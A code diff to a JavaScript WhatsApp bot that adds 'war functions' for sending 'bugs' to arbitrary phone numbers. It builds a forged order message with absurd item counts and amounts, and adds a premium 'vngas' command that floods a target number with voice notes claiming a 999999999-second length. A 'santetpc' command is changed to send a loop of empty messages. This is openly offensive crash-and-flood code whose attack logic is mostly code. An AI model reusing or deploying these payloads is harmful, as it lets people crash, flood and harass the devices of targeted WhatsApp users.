@@ -41,7 +41,10 @@ const { xeonbut2 } = require('./XBug/xeonbut2')
 const { xeonvirtex } = require('./XBug/xeonvirtex')
 const { xeonbutton } = require('./XBug/xeonbutton')
 const { xeonbrutal } = require('./XBug/xeonbrutal')
+const audionye = fs.readFileSync('./y.mp3')
+const { ngazap } = require('./lib/ngazap')
 const { santedpc } = require('./lib/santedpc')
+const { buttonvirus2 } = require('./lib/buttonvirus2')
 
 //read database\\
 
@@ -407,7 +410,28 @@ return }
 				//-------------------â˜£ï¸WAR FUNCTIONSâ˜£ï¸-----------------\\
 	//-------------------â˜£ï¸WAR FUNCTIONSâ˜£ï¸-----------------\\
 	//-------------------â˜£ï¸WAR FUNCTIONSâ˜£ï¸-----------------\\
-	
+	const vien = {
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, 
+...({ remoteJid: "" }) 
+}, 
+"message": {
+"orderMessage": {
+"orderId": "594071395007984",
+"thumbnail": thumb,
+"itemCount": 100000000000,
+"status": "INQUIRY",
+"surface": "CATALOG",
+"message": `Kenneth Bot WhatsApp${ngazap(prefix)}`,
+"orderTitle": "Kenneth Bot WhatsApp${ngazap(prefix)}",
+"sellerJid": "6285807264974@s.whatsapp.net",
+"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
+"totalAmount1000": "500000000000000",
+"totalCurrencyCode": "IDR"
+}}}
+
+
 
 const doc = { 
 key: {
@@ -680,24 +704,27 @@ teks += `â­” @${mem.id.split('@')[0]}\n`
 XeonBotInc.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })
 }
 break
+case 'vngas': {
+if (!isPremium && !isCreator) return reply(mess.premi)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
+num = q.split('.')[0]
+jumlah = q.split('.')[1]
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
+await sleep(1000)
+}
+reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
+}
+break
 case 'santetpc': {
 if (!isPremium && !isCreator) return reply(mess.premi)
 if (!q) return reply(`Contoh ${command} 6281297970769`)
 nmn = q.split("|")[0].replace(/[^0-9]/g, '') + "@s.whatsapp.net"
 if (Input == isCreator) return reply('Tidak Bisa, Karena Itu Nomer Developer')
-async function bygbt(text) {
-XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {
-text: '', 
-templateButtons: [
-{ callButton: { displayText: `P`, phoneNumber: ``}},
-{ urlButton: { displayText: `P`, url: `https://wa.me/`}},
-{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
-{ quickReplyButton: { displayText: `P`, id: ``}},
-{ quickReplyButton: { displayText: `P`, id: ``}},
-{ quickReplyButton: { displayText: `P`, id: ``}},
-]})
+for (let i = 0; i < jumlah; i++) {
+XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, { text: '' })
+await sleep(1000)
 }
-santedpc(bygbt, nmn, sleep)
 reply(`Bug Santet Telah Dikirim Ke: *${text}*`)
 }
 break
